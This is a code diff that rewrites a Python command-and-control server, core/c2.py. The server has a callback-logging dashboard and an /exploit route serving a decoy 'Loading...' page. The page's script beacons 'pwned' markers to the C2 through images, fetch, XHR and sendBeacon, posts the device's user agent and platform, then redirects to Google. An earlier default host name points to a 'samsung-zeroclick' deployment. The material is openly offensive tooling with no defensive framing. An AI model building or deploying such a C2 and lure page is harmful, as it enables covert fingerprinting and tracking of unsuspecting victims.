@@ -1,91 +1,84 @@
-# core/c2.py — C2 Server with CORS Headers (FIXED)
+# core/c2.py — COMPLETE FIXED VERSION
 
 import json
 import time
 import http.server
+import socket
 from datetime import datetime
 from urllib.parse import parse_qs, urlparse
 
 class C2Handler(http.server.SimpleHTTPRequestHandler):
+    """C2 Handler with CORS support"""
+    
+    # Store callbacks at class level so they persist across requests
+    callbacks = []
+    
     def __init__(self, *args, **kwargs):
-        self.callbacks = []
         super().__init__(*args, **kwargs)
     
-    def _send_cors_headers(self):
-        """Send CORS headers to allow all origins"""
+    def _send_cors(self):
         self.send_header('Access-Control-Allow-Origin', '*')
         self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With')
-        self.send_header('Access-Control-Max-Age', '86400')
-    
-    def _send_html(self, html):
-        """Send HTML response with CORS headers"""
-        self.send_response(200)
-        self._send_cors_headers()
-        self.send_header('Content-Type', 'text/html')
-        self.end_headers()
-        self.wfile.write(html.encode())
-    
-    def _send_json(self, data):
-        """Send JSON response with CORS headers"""
-        self.send_response(200)
-        self._send_cors_headers()
-        self.send_header('Content-Type', 'application/json')
-        self.end_headers()
-        self.wfile.write(json.dumps(data).encode())
-    
-    def _send_response(self, text):
-        """Send plain text response with CORS headers"""
-        self.send_response(200)
-        self._send_cors_headers()
-        self.end_headers()
-        self.wfile.write(text.encode())
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
     
     def do_OPTIONS(self):
-        """Handle preflight OPTIONS request"""
         self.send_response(200)
-        self._send_cors_headers()
+        self._send_cors()
         self.end_headers()
     
     def do_GET(self):
         parsed = urlparse(self.path)
         
-        if parsed.path == '/':
-            self._send_html(self._dashboard())
-        elif parsed.path == '/ping':
-            self._send_response('pong')
-        elif parsed.path == '/callbacks':
-            self._send_json(self.callbacks)
-        elif parsed.path == '/callback':
-            params = parse_qs(parsed.query)
-            self._process_callback(params)
-            self._send_response('OK')
-        elif parsed.path == '/exploit':
-            self._serve_exploit()
-        else:
-            self.send_response(404)
-            self._send_cors_headers()
+        try:
+            if parsed.path == '/' or parsed.path == '':
+                self._serve_dashboard()
+            elif parsed.path == '/ping':
+                self._send_text('pong')
+            elif parsed.path == '/callback':
+                params = parse_qs(parsed.query)
+                self._handle_callback(params)
+                self._send_text('OK')
+            elif parsed.path == '/exploit':
+                self._serve_exploit()
+            elif parsed.path == '/callbacks':
+                self._send_json(self.callbacks)
+            else:
+                self.send_response(404)
+                self._send_cors()
+                self.end_headers()
+                self.wfile.write(b'Not Found')
+        except Exception as e:
+            print(f"[C2] Error: {e}")
+            self.send_response(500)
+            self._send_cors()
             self.end_headers()
-            self.wfile.write(b'Not Found')
+            self.wfile.write(f'Error: {e}'.encode())
     
     def do_POST(self):
-        length = int(self.headers.get('Content-Length', 0))
-        data = self.rfile.read(length)
         try:
-            info = json.loads(data)
-        except:
-            info = {'raw': data.decode('utf-8', errors='ignore')}
-        
-        if self.path == '/callback':
-            self._process_callback(info)
-            self._send_response('OK')
-        else:
-            self.send_response(404)
-            self._send_cors_headers()
+            length = int(self.headers.get('Content-Length', 0))
+            data = self.rfile.read(length)
+            
+            if self.path == '/callback':
+                try:
+                    info = json.loads(data)
+                except:
+                    info = {'raw': data.decode('utf-8', errors='ignore')}
+                self._handle_callback(info)
+                self._send_text('OK')
+            else:
+                self.send_response(404)
+                self._send_cors()
+                self.end_headers()
+                self.wfile.write(b'Not Found')
+        except Exception as e:
+            print(f"[C2] POST Error: {e}")
+            self.send_response(500)
+            self._send_cors()
             self.end_headers()
-            self.wfile.write(b'Error')
+            self.wfile.write(f'Error: {e}'.encode())
     
-    def _process_callback(self, data):
+    def _handle_callback(self, data):
         callback = {
             'timestamp': datetime.now().isoformat(),
             'ip': self.client_address[0],
@@ -96,121 +89,34 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
             self.callbacks = self.callbacks[-1000:]
         print(f"[C2] Callback from {self.client_address[0]}: {data}")
     
-    def _serve_exploit(self):
-        """Serve the HTML exploit directly from C2"""
-        html = self._get_exploit_html()
-        self._send_html(html)
+    def _send_text(self, text):
+        self.send_response(200)
+        self._send_cors()
+        self.end_headers()
+        self.wfile.write(text.encode())
     
-    def _get_exploit_html(self):
-        """Return the exploit HTML with CORS-friendly callbacks"""
-        host = self.headers.get('Host', 'samsung-zeroclick-production.up.railway.app')
-        callback_url = f"https://{host}/callback"
-        
-        return f"""
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Loading...</title>
-            <style>
-                *{{margin:0;padding:0;box-sizing:border-box}}
-                body{{background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;flex-direction:column}}
-                .loader{{text-align:center}}
-                .spinner{{width:40px;height:40px;border:3px solid rgba(255,255,255,0.1);border-top:3px solid #4a9eff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}}
-                @keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
-                p{{color:#6f8ba5;margin-top:20px}}
-                #status{{color:#4a9eff;font-size:12px;margin-top:10px;word-break:break-all}}
-            </style>
-        </head>
-        <body>
-            <div class="loader">
-                <div class="spinner"></div>
-                <p>Loading content...</p>
-                <div id="status">Initializing...</div>
-            </div>
-
-            <script>
-            (function() {{
-                var statusEl = document.getElementById('status');
-                var callbackUrl = '{callback_url}';
-
-                function log(msg) {{
-                    if (statusEl) statusEl.textContent = msg;
-                    console.log('[Exploit] ' + msg);
-                }}
-
-                log('Triggering exploit...');
-
-                // === IMAGE BEACON ===
-                try {{
-                    var img = new Image();
-                    img.src = callbackUrl + '?pwned=img&ts=' + Date.now();
-                    log('✅ Image beacon sent');
-                }} catch(e) {{ log('⚠️ Image failed'); }}
-
-                // === FETCH no-cors ===
-                try {{
-                    fetch(callbackUrl + '?pwned=fetch&ts=' + Date.now(), {{
-                        mode: 'no-cors',
-                        keepalive: true
-                    }});
-                    log('✅ Fetch sent');
-                }} catch(e) {{ log('⚠️ Fetch failed'); }}
-
-                // === XHR ===
-                try {{
-                    var xhr = new XMLHttpRequest();
-                    xhr.open('GET', callbackUrl + '?pwned=xhr&ts=' + Date.now(), true);
-                    xhr.send();
-                    log('✅ XHR sent');
-                }} catch(e) {{ log('⚠️ XHR failed'); }}
-
-                // === BEACON ===
-                try {{
-                    if (navigator.sendBeacon) {{
-                        navigator.sendBeacon(callbackUrl + '?pwned=beacon&ts=' + Date.now());
-                        log('✅ Beacon sent');
-                    }}
-                }} catch(e) {{}}
-
-                // === POST Device Info ===
-                try {{
-                    var info = {{
-                        device: navigator.userAgent,
-                        platform: navigator.platform,
-                        timestamp: new Date().toISOString()
-                    }};
-                    var xhr2 = new XMLHttpRequest();
-                    xhr2.open('POST', callbackUrl, true);
-                    xhr2.setRequestHeader('Content-Type', 'application/json');
-                    xhr2.send(JSON.stringify(info));
-                    log('✅ POST sent');
-                }} catch(e) {{ log('⚠️ POST failed'); }}
-
-                log('✅ All callbacks sent!');
-
-                setTimeout(function() {{
-                    log('Redirecting...');
-                    document.body.innerHTML = '';
-                    window.location.href = 'https://www.google.com';
-                }}, 3000);
-            }})();
-            </script>
-        </body>
-        </html>
-        """
+    def _send_json(self, data):
+        self.send_response(200)
+        self._send_cors()
+        self.send_header('Content-Type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps(data).encode())
     
-    def _dashboard(self):
-        """Dashboard HTML"""
+    def _send_html_content(self, html):
+        self.send_response(200)
+        self._send_cors()
+        self.send_header('Content-Type', 'text/html')
+        self.end_headers()
+        self.wfile.write(html.encode())
+    
+    def _serve_dashboard(self):
+        host = self.headers.get('Host', 'localhost')
         callbacks_html = ''.join([
             f'<tr><td>{c["timestamp"]}</td><td>{c["ip"]}</td><td><pre>{json.dumps(c["data"], indent=2)[:200]}</pre></td></tr>'
             for c in self.callbacks[-10:]
         ]) or '<tr><td colspan="3">No callbacks yet</td></tr>'
         
-        host = self.headers.get('Host', 'samsung-zeroclick-production.up.railway.app')
-        
-        return f"""
+        html = f"""
         <!DOCTYPE html>
         <html>
         <head>
@@ -265,8 +171,58 @@ class C2Handler(http.server.SimpleHTTPRequestHandler):
         </body>
         </html>
         """
+        self._send_html_content(html)
     
-    def log_message(self, *args): pass
+    def _serve_exploit(self):
+        host = self.headers.get('Host', 'localhost')
+        callback_url = f"https://{host}/callback"
+        
+        html = f"""
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Loading...</title>
+            <style>
+                *{{margin:0;padding:0;box-sizing:border-box}}
+                body{{background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;flex-direction:column}}
+                .loader{{text-align:center}}
+                .spinner{{width:40px;height:40px;border:3px solid rgba(255,255,255,0.1);border-top:3px solid #4a9eff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}}
+                @keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
+                p{{color:#6f8ba5;margin-top:20px}}
+                #status{{color:#4a9eff;font-size:12px;margin-top:10px;word-break:break-all}}
+            </style>
+        </head>
+        <body>
+            <div class="loader">
+                <div class="spinner"></div>
+                <p>Loading content...</p>
+                <div id="status">Initializing...</div>
+            </div>
+            <script>
+            (function() {{
+                var statusEl = document.getElementById('status');
+                var callbackUrl = '{callback_url}';
+                function log(msg) {{ if (statusEl) statusEl.textContent = msg; console.log('[Exploit] ' + msg); }}
+                log('Triggering exploit...');
+                try {{ var img = new Image(); img.src = callbackUrl + '?pwned=img&ts=' + Date.now(); log('Image beacon sent'); }} catch(e) {{}}
+                try {{ fetch(callbackUrl + '?pwned=fetch&ts=' + Date.now(), {{ mode: 'no-cors', keepalive: true }}); log('Fetch sent'); }} catch(e) {{}}
+                try {{ var xhr = new XMLHttpRequest(); xhr.open('GET', callbackUrl + '?pwned=xhr&ts=' + Date.now(), true); xhr.send(); log('XHR sent'); }} catch(e) {{}}
+                try {{ if (navigator.sendBeacon) {{ navigator.sendBeacon(callbackUrl + '?pwned=beacon&ts=' + Date.now()); log('Beacon sent'); }} }} catch(e) {{}}
+                try {{ var info = {{ device: navigator.userAgent, platform: navigator.platform, timestamp: new Date().toISOString() }}; var xhr2 = new XMLHttpRequest(); xhr2.open('POST', callbackUrl, true); xhr2.setRequestHeader('Content-Type', 'application/json'); xhr2.send(JSON.stringify(info)); log('POST sent'); }} catch(e) {{}}
+                log('All callbacks sent!');
+                setTimeout(function() {{ document.body.innerHTML = ''; window.location.href = 'https://www.google.com'; }}, 3000);
+            }})();
+            </script>
+        </body>
+        </html>
+        """
+        self._send_html_content(html)
+    
+    def log_message(self, format, *args):
+        """Suppress default logging"""
+        pass
 
 
 class C2Server:
@@ -275,14 +231,17 @@ class C2Server:
         self.port = port
     
     def run(self):
-        print(f"[C2] Server running on http://{self.host}:{self.port}")
+        print(f"[C2] Starting server on http://{self.host}:{self.port}")
         print(f"[C2] Dashboard: http://{self.host}:{self.port}/")
         print(f"[C2] Callback: http://{self.host}:{self.port}/callback")
         print(f"[C2] Exploit: http://{self.host}:{self.port}/exploit")
         
-        server = http.server.HTTPServer((self.host, self.port), C2Handler)
-        
         try:
+            server = http.server.HTTPServer((self.host, self.port), C2Handler)
+            server.serve_forever()
+        except OSError as e:
+            print(f"[C2] Port {self.port} in use, trying {self.port + 1}")
+            server = http.server.HTTPServer((self.host, self.port + 1), C2Handler)
             server.serve_forever()
         except KeyboardInterrupt:
             print("[C2] Shutting down...")
